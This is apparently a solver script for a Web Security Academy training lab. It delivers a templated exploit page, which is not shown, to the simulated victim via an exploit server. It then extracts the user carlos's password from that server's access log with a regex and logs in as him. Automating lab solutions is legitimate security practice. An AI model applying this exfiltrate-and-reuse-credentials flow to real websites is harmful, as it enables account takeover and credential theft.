from web_security_academy.core.logger import logger
from web_security_academy.core.utils import read_file

from urllib.parse import urlparse
from jinja2 import Environment

import re


def solve_lab(session):
    lab_server_hostname = urlparse(session.url).hostname
    exploit_server = session.exploit_server()

    template = Environment().from_string(read_file("exploit.html").decode())
    body = template.render(
        lab_server=lab_server_hostname,
        exploit_server=exploit_server.hostname,
    )

    headers = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8"
    exploit_server.deliver_exploit_to_victim("/exploit", headers, body)

    log = exploit_server.access_log()
    password = re.search(r"%20([a-z0-9]{20})%22", log).group(1)
    logger.success(f"Extracted carlos's password from access log: {password}")
    session.login("carlos", password)
